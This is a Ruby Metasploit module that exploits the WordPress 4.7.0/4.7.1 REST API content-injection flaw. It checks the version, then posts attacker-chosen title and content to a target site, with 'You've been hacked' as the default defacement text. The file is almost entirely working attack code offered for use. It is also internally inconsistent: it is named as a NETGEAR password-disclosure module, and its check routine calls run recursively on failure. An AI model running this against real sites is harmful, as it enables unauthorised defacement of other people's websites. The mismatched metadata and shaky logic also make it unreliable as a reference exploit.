##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rest-client'
require 'json'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NETGEAR Administrator Password Disclosure',
      'Description'    => %q{
        This module exploits a content injection flaw in WordPress versions 
        4.7.0 and 4.7.1 only. This module will make a new customizable post
        in index.php?p=POSTID.
      },
      'Author'         =>
        [
          'Harsh Jaiswal', # Vuln Discovery, PoC
          'thecarterb'   # Metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html'],
          [ 'EDB', '41224']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
    [
      OptString::new('POSTID', [true, 'The id of the new post', nil]),
      OptString::new('TITLE', [true, 'Title of the new post', 'You\'ve been hacked']),
      OptString::new('CONTENT', [true, 'Content of the new post', 'Update your wordpress version']),
      Opt::RPORT(80)
    ], self.class)
  end

  def check
    vprint_status("Requesting #{rhost}/readme.html for version check")
    res = send_request_cgi({'uri' => '/readme.html'})

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while determining WP verion, running module anyway.')
      run
    end
    
    html = res.to_s
    start_trig = "<br /> "
    end_trig = "</h1>"
    version = html[/#{start_trig}(.*?)#{end_trig}/m, 1]
    if version == "Version 4.7.0" || version == "Version 4.7.1"
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    id = datastore['POSTID']
    title = datastore['TITLE']
    content = datastore['CONTENT']
    rhost = datastore['RHOST']
    
    version = check
    if version == Exploit::CheckCode::Safe
      print_error("#{rhost} is not vulnerable.")
      return
    end
    response = RestClient.post(
    "#{rhost}/index.php/wp-json/wp/v2/posts/#{id}",
    {
        "id"      =>  "#{id}",
        "title"   =>  "#{title}",
        "content" =>  "#{content}" 
    }.to_json,
    :content_type => :json,
    :accept       => :json
    ) {|response, request, result| response}
    if response.code == 200
      print_good("Done! #{rhost}/index.php?p=#{id}")
    else
      print_error("Website not vulnerable")
    end
  end  
end
